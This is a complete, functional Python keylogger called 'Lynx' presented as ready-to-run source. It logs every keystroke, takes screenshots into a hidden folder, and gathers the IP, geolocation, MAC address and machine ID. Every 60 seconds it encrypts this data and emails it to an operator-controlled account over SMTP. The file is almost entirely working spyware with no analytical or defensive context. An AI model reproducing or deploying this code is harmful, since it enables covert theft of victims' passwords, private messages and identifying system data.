#!/usr/bin/env python3
import os
import smtplib
import socket
import platform
import re
import uuid
import json
import random
import string
from urllib.request import urlopen
import pyscreenshot
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.image import MIMEImage
import pynput.keyboard as Keyboard
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
import hashlib
import base64
from threading import Timer
import time

EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
EMAIL_PASSWORD = "YOUR_PASSWORD"
INTERVAL = 60 # In seconds
SMTP_SERVER = "smtp.gmail.com" # Use the SMTP server of your email provider
SMTP_PORT = 587 # Port of your SMTP Server
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxdZr6CoSNcoTQwPY3Ovu
JsdVzsVyIjELEelnnzCP9PyORhIAsHMrxNYQ8WVvdILLdX0gXQGLaehpRcwGZy7J
ccj0tEWFPAWP3AM8J6XTaTo9TzsmQDK5NKwyiEyFeSDFmuEVQ6FGtBua4yvOk9iZ
giof4k3U8pFCXJFyeq0HW9TE+3cJGJNO599QGq88bH+Bu25OW+emIE09pLh2umGj
ho4PVkF69tA/WgSQgROPxl81Ha42kooi1rbLVpurL9+CnCeN1uoNsotwgBU6V3Ut
25yTvXP54xXn8LsO1SuwPm/eBtKCVz70Od7IHeDCU+FCwet0xhwcGNCEwHxKkhGg
L5iRy8SoM4MBhh5hREqe9WYErXRtkuj1mcVLR+YdRTIpD7onZeGmubejQDJ4L++o
LYe++pYvb4NULg7BsN9UEmo/u7MLvi1xYKZ+wg7W0EmZ1uPPx6cpPc2aERbIX9wI
8Lvw++zwNCAaNY09uOfjDO36dcCnI7H4kf872w/RThOZOY0VbcfzDyw8RE9egYhy
ts5Cy7f7rDy+O8WeJxmyL1IzNt0EWwB8me0bEvKnf9LIGi2N3QLcl5lGcNfa7vTg
QB58cv/doBMIWlkhePxAl79vVuCihgRPcdKdI63DAKTOWvS6XL9u7YrXUbQv9SFx
PhNgq3uleTRFpQeVbEr0fHECAwEAAQ==
-----END PUBLIC KEY-----"""


class Keylogger():
    def __init__(self):
        self.interval = INTERVAL
        self.email = EMAIL_ADDRESS
        self.password = EMAIL_PASSWORD
        self.smtp_host = SMTP_SERVER
        self.smtp_port = SMTP_PORT
        self.log = "Keylogger started ...\n"
        self.dir = "/tmp/.cache/.lynx"
        self.system_info = ""
        os.makedirs(self.dir) if not os.path.exists(self.dir) else None
    
    def append_to_log(self, string):
        self.log += str(string)

    def append_to_system_info(self, string):
        self.system_info += str(string)

    def sysinfo(self):
        hostname = socket.gethostname()
        ip_info = json.load(urlopen("http://ipinfo.io/json"))
        ip = ip_info["ip"]
        geolocation = f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
        system = f"{platform.system()} {platform.release()}"
        arch = platform.machine()
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        machine_id = open("/etc/machine-id", "r").read()
        self.append_to_system_info(f"IP address : {ip}\n")
        self.append_to_system_info(f"Geolocation : {geolocation}\n")
        self.append_to_system_info(f"Hostname : {hostname}\n")
        self.append_to_system_info(f"System : {system}\n")
        self.append_to_system_info(f"Architecture : {arch}\n")
        self.append_to_system_info(f"MAC address : {mac_address}\n") 
        self.append_to_system_info(f"Unique machine ID : {machine_id}\n")
        self.send_mail(Encryption().encrypt(self.system_info))
    
    def screenshot(self):
        filename = ''.join(random.choice(string.ascii_letters) for x in range(10))
        img = pyscreenshot.grab()
        path = f"{self.dir}/.{filename}.png"
        img.save(path)
        return path
    
    def send_mail(self, body, attachment=None):
        msg = MIMEMultipart()
        msg["To"] = self.email
        msg["From"] = self.email
        msg["Subject"] = f"Lynx Report"
        msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html')   
        msg.attach(msgText)
        if attachment:
            with open(attachment, 'rb') as fp:
                img = MIMEImage(fp.read())
            img.add_header('Content-ID', f'<{attachment}>')
            msg.attach(img)
        
        server = smtplib.SMTP(host=self.smtp_host, port=self.smtp_port)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, msg.as_string())
        server.quit()
    
    def log_keys(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.esc:
                current_key = "<ESC> "
                self.append_to_log(current_key)
            elif key == key.space:
                current_key = "<SPACE> "
                self.append_to_log(current_key)
            elif key == key.shift_r:
                current_key = "<RIGHT SHIFT> "
                self.append_to_log(current_key)
            elif key == key.shift_l:
                current_key = "<LEFT SHIFT> "
                self.append_to_log(current_key)
            elif key == key.ctrl:
                current_key = "<CONTROL> "
                self.append_to_log(current_key)
            elif key == key.backspace:
                self.log = self.log[:-1]
            elif key == key.alt:
                current_key = "<ALT> "
                self.append_to_log(current_key)
            elif key == key.tab:
                current_key = "<TAB> "
                self.append_to_log(current_key)
            elif key == key.caps_lock:
                current_key = "<CAPS LOCK> "
                self.append_to_log(current_key)
            elif key == key.cmd:
                current_key = "<FN/WIN> "
                self.append_to_log(current_key)
            elif key == key.delete:
                current_key = "<DEL> "
                self.append_to_log(current_key)
            elif key == key.print_screen:
                current_key = "<PRINT SCREEN> "
                self.append_to_log(current_key)
            else:
                current_key = str(f" {key} ")
                self.append_to_log(current_key)
    
    def report(self):
        self.send_mail(Encryption().encrypt(self.log), self.screenshot()) #ENC
        class RepeatTimer(Timer):
            def run(self):
                while not self.finished.wait(self.interval):
                    self.function(*self.args, **self.kwargs)
        timer = RepeatTimer(self.interval, self.report)
        timer.start()

    def run(self):
        self.sysinfo()
        keyboard_listener = Keyboard.Listener(on_press=self.log_keys)
        try:
            keyboard_listener.start()
            time.sleep(self.interval)
            self.report()
        except KeyboardInterrupt: 
            self.send_mail(Encryption().encrypt(self.log), self.screenshot())


class Encryption():
    def __init__(self):
        # AES
        self.block_size = 16
        self.key_length = 60
        self.key = self.get_key()
        # RSA
        self.public_key = RSA_PUBLIC_KEY

    def get_key(self):
        string.printable = string.printable.split(" ")[0]
        return ''.join(random.choice(string.printable) for _ in range(self.key_length))

    def pad(self, object):
        return (object + (self.block_size - len(object) % self.block_size) * chr(self.block_size - len(object) % self.block_size)).encode("utf-8")

    def unpad(self, object):
        return (object[:-ord(object[len(object) - 1:])])

    def AESencrypt(self, plaintext):
        private_key = hashlib.sha256(self.key.encode("utf-8")).digest()
        iv = Random.new().read(self.block_size)
        plaintext = self.pad(plaintext)
        cipher = AES.new(private_key, AES.MODE_EAX, iv)
        return base64.b64encode(iv + cipher.encrypt(plaintext)).decode("utf-8")

    def RSAencrypt(self, plaintext):
        publicKey = RSA.importKey(RSA_PUBLIC_KEY)
        cipher = PKCS1_OAEP.new(publicKey)
        ciphertext = cipher.encrypt(plaintext.encode())
        return base64.b64encode(ciphertext).decode("utf-8")
    
    def encrypt(self, plaintext):
        logs = self.AESencrypt(plaintext)
        key = self.RSAencrypt(self.key)
        return f"\nLogs:\n{logs}\n\n\nKey:\n{key}\n\n"

keylogger = Keylogger()
keylogger.run()